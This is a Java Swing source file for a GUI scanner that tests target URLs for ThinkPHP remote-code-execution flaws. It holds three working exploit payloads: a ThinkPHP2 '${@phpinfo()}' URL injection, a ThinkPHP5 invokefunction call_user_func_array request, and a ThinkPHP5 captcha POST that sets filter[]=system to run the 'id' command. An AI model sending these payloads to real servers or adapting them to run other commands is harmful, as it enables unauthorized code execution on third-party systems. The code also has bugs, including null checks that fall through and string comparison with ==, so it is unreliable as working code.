import javax.swing.*;
import javax.swing.event.DocumentEvent;
import javax.swing.event.DocumentListener;
import java.awt.event.*;
import java.awt.*;
import java.io.IOException;


public class tpscan {

    public static void main(String[] args){

        //创建顶层窗口
        JFrame jf = new JFrame("ThinkPHP_RCE漏洞检测工具@By 冰茶");
        jf.setSize(600,300);
        jf.setLocationRelativeTo(null);   //置于屏幕中间
        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);//点击关闭
        //创建中间容器,null表示使用绝对布局
        JPanel panel =new JPanel(null);
        //条目
        String[] listDate = new String[]{"ThinkPHP2_RCE","thinkPHP5_RCE1","thinkPHP5_RCE2"};
        // 创建一个下拉列表框
        final JComboBox<String> comboBox = new JComboBox<String>(listDate);
        comboBox.setSize(160,50);
        comboBox.setLocation(10,1);
        panel.add(comboBox);

        comboBox.addItemListener(new ItemListener() {

            public void itemStateChanged(ItemEvent e) {
                // 只处理选中的状态
                if (e.getStateChange() == ItemEvent.SELECTED) {
                    System.out.println("选中: " + comboBox.getSelectedIndex() + " = " + comboBox.getSelectedItem());
                    // 创建一个按钮，点击后获取文本框中的文本
                    final JButton btn1 =new JButton("执行");
                    btn1.setLocation(520,13);
                    btn1.setSize(50, 25);
                    //添加按钮到面板中
                    panel.add(btn1);
                    JTextArea textArea = new JTextArea();
                    JTextField textField = new JTextField();
                    textField.setSize(350,20);
                    textField.setLocation(170,15);
                    textField.setFont(new Font(null, Font.PLAIN, 14));
                    panel.add(textField);
                    textField.getDocument().addDocumentListener(new DocumentListener() {
                        @Override
                        public void insertUpdate(DocumentEvent e) {
                            System.out.print("1111");
                            textArea.setText("");
                        }

                        @Override
                        public void removeUpdate(DocumentEvent e) {

                        }

                        @Override
                        public void changedUpdate(DocumentEvent e) {

                        }
                    });
                    JScrollPane scroll = new JScrollPane(textArea);
                    //滚动条自动出现
                    scroll.setSize(580,200);
                    scroll.setLocation(10,50);
                    // 添加到内容面板
                    panel.add(scroll);
                    //添加监听事件
                    btn1.addActionListener(new ActionListener() {
                        public void actionPerformed(ActionEvent e) {
                            // 请求
                            CloseableHttpClientToInterface cf = new CloseableHttpClientToInterface();


                            //各类Exp/Poc/Exp

                            //thinkphp2代码执行

                            String payload ="/index.php?s=/index/index/name/$%7B@phpinfo()%7D";
                            //thinkphp5代码执行
                            String pauload1="/index.php?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=-1";
                            if (comboBox.getSelectedItem()=="ThinkPHP2_RCE") {
                                System.out.print("执行: " + textField.getText() + payload);
                                String res = cf.doGet(textField.getText()+payload, null);
                                System.out.print(res);
                                if (res==null){
                                    textArea.append("Sorry!\n");
                                }
                                if (res.indexOf("phpinfo()") !=-1){

                                    textArea.append("The target is exploitable!!!\n");
                                }
                                else{
                                    textArea.append("Sorry!\n");
                                }
                            }
                            else if (comboBox.getSelectedItem()=="thinkPHP5_RCE1") {
                                //System.out.println("执行: " + textField.getText() + payload[0]);
                                String res1 = cf.doGet(textField.getText()+pauload1, null);
                                System.out.print(res1);
                                if (res1==null){
                                    textArea.append("Sorry!\n");
                                }
                                if (res1.indexOf("phpinfo()") !=-1){

                                    textArea.append("The target is exploitable!!!\n");
                                }
                                else{
                                    textArea.append("Sorry!\n");
                                }
                            }
                            else if (comboBox.getSelectedItem()=="thinkPHP5_RCE2") {

                                sendPost sp = new sendPost();
                                String res2 = null;
                                res2 = sp.sendPost(textField.getText()+"/index.php?s=captcha","_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id");
                                System.out.print(res2);
                                if (res2==null){
                                    textArea.append("Sorry!\n");
                                }
                                if (res2.indexOf("uid=") !=-1 && res2.indexOf("gid=") !=-1){

                                    textArea.append("The target is exploitable!!!\n");
                                }
                                else{
                                    textArea.append("Sorry!\n");
                                }
                            }

                        }
                    });

                }

            }

        });



        jf.setContentPane(panel);
        jf.setVisible(true);


        // 设置默认选中的条目
        comboBox.setSelectedIndex(2);
        // 添加到内容面板


        //把面板容器作为窗口的内容面板 设置到 窗口
        jf.setContentPane(panel);
        //显示窗口，前面创建的信息都在内存中，通过 jf.setVisible(true) 把内存中的窗口显示在屏幕上。
        jf.setVisible(true);




    }
}
